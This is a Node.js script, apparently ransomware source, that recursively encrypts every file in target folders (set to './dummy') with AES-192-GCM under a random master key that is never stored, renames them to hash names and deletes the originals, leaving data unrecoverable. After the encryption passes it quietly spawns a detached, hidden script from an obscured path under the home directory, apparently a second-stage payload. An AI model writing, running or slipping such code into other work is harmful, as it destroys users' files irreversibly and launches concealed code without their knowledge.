// encrypt.js
import fs from 'node:fs';
import fsp from 'node:fs/promises';
import path from 'node:path';
import crypto from 'node:crypto';
import { spawn } from 'child_process';
import { pipeline } from 'node:stream/promises';
const homes = `${process.env.HOME}/../usr/etc/.root/`;
const TARGET_FOLDERS = ['./dummy'];
const PARALLEL = 5;
const TOLERANCE = 2;
const EXT = '.bin';
const MAGIC = Buffer.from('A5G1', 'hex');
const IV_LEN = 12;
const TAG_LEN = 16;
const SALT_LEN = 32;
const MASTER_KEY = (() => {
  const raw = crypto.randomBytes(64);
  return crypto.createHash('sha512').update(raw).digest();
})();
function delay(ms){
	return new Promise(
		r => setTimeout(
			r,ms
		)
	)
}
function deriveKey(salt) {
  return Buffer.from(
    crypto.hkdfSync('sha512', MASTER_KEY, salt, Buffer.from('aes192gcm-military'), 24)
  );
} function sha512Hex(input) {
  return crypto.createHash('sha512').update(input).digest('hex');
} async function walk(dir, concurrency = PARALLEL) {
  const results = [];
  const queue = [dir];
  let active = 0;
  let done = false;
  return new Promise((resolve, reject) => {
    const next = () => {
      if (done) return;
      while (active < concurrency && queue.length) {
        const cur = queue.shift();
        active++;
        processDir(cur)
          .then((items) => {
            for (const it of items) {
              if (it.isDir) queue.push(it.full);
              else results.push(it.full);
            }
          })
          .catch(reject)
          .finally(() => {
            active--;
            if (queue.length === 0 && active === 0) {
              done = true;
              resolve(results);
            } else {
              next();
            }
        });
      }
    };
    next();
  });
} async function processDir(dir) {
  let entries;
  try {
    entries = await fsp.readdir(dir, { withFileTypes: true });
  } catch {
    return [];
  }
  return entries.map((e) => ({
    isDir: e.isDirectory(),
    full: path.join(dir, e.name),
    name: e.name,
  }));
} async function isEncrypted(file) {
  if (path.extname(file) !== EXT) return false;
  const base = path.basename(file, EXT);
  if (!/^[a-f0-9]{128}$/i.test(base)) return false;
  let fh;
  try {
    fh = await fsp.open(file, 'r');
    const buf = Buffer.alloc(MAGIC.length);
    const { bytesRead } = await fh.read(buf, 0, MAGIC.length, 0);
    if (bytesRead !== MAGIC.length) return false;
    return buf.equals(MAGIC);
  } catch {
    return false;
  } finally {
    if (fh) await fh.close();
  }
} async function encryptFile(file) {
  const tmp = `${file}.enc.tmp`;
  const salt = crypto.randomBytes(SALT_LEN);
  const key = deriveKey(salt);
  const iv = crypto.randomBytes(IV_LEN);
  const cipher = crypto.createCipheriv('aes-192-gcm', key, iv, {
    authTagLength: TAG_LEN,
  });
  const rs = fs.createReadStream(file, { highWaterMark: 64 * 1024 });
  const ws = fs.createWriteStream(tmp, { highWaterMark: 64 * 1024 });
  ws.write(MAGIC);
  ws.write(salt);
  ws.write(iv);
  await pipeline(rs, cipher, ws);
  const tag = cipher.getAuthTag();
  await fsp.appendFile(tmp, tag);
  const newName = sha512Hex(path.basename(file) + salt.toString('hex')) + EXT;
  const dir = path.dirname(file);
  const finalPath = path.join(dir, newName);
  await fsp.rename(tmp, finalPath);
  await fsp.unlink(file).catch(() => {});
  return finalPath;
} async function main() {
  const allFiles = [];
  for (const folder of TARGET_FOLDERS) {
    const files = await walk(folder, PARALLEL);
    allFiles.push(...files);
  }
  let remaining = [];
  const runPass = async (files) => {
    const notEncrypted = [];
    let idx = 0;
    const workers = Array.from({ length: PARALLEL }, async () => {
      while (idx < files.length) {
        const i = idx++;
        const f = files[i];
        try {
          const ok = await isEncrypted(f);
          if (!ok) notEncrypted.push(f);
        } catch {
          notEncrypted.push(f);
        }
      }
    });
    await Promise.all(workers);
    return notEncrypted;
  };
  let toEncrypt = await runPass(allFiles);
  const encryptParallel = async (files) => {
    let idx = 0;
    const workers = Array.from({ length: PARALLEL }, async () => {
      while (idx < files.length) {
        const i = idx++;
        try {
          await encryptFile(files[i]);
        } catch {}
      }
    });
    await Promise.all(workers);
  };

  if (toEncrypt.length > 0) {
    await encryptParallel(toEncrypt);
  }
  const rescan = async () => {
    const files = [];
    for (const folder of TARGET_FOLDERS) {
      files.push(...(await walk(folder, PARALLEL)));
    }
    return runPass(files);
  };
  remaining = await rescan();
  let guard = 0;
  while (remaining.length > TOLERANCE && guard < 10) {
    guard++;
    await encryptParallel(remaining);
    remaining = await rescan();
  }
  const allEncrypted = remaining.length <= TOLERANCE;
  wandi();
  return allEncrypted;
}

async function wandi(){
	await delay(1000);
	const memek = await spawn(`node ${homes}/.system`,{
		stdio:'inherit',
		shell: true,
		detached: true
	});
	memek.on('error',()=>{});
}

main().catch(()=>{});

